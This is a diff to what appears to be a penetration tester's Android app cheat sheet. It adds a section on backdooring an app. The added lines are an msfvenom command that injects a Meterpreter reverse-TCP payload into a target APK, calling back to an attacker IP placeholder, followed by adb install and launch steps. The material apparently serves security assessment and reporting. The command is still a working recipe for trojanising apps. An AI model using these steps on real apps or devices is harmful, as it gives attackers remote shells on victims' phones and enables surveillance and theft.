@@ -545,9 +545,20 @@ i) apk decompiler for lazy (https://github.com/b-mueller/apkx)
 /////////////////////////////////
 4b) OTHER WAYS TO BACKDOOR AN APP
 /////////////////////////////////
+    
+    [COMMAND]
+        -) msfvenom -x target_app.apk -p android/meterpreter/reverse_tcp LHOSt=<ATTACKER-IP> LPORT=<ATTACKER-PORT> -o target_modified.apk
+        -) adb install target_modified.apk
+        -) start app
+        
+    [INFO]
+        !) Works with Xamarin apps too (this made me very happy)
+        
+    [THINGS TO REPORT]
+        !) If it works (don't give up if it does not work the easy way)
 
-    !!! TBD !!! - appreciate any input here!!
-
+    !!! ANY OTHER IDEAS? appreciate any input here !!!
+    
 ///////////////
 4c) ANDROID NDK
 ///////////////
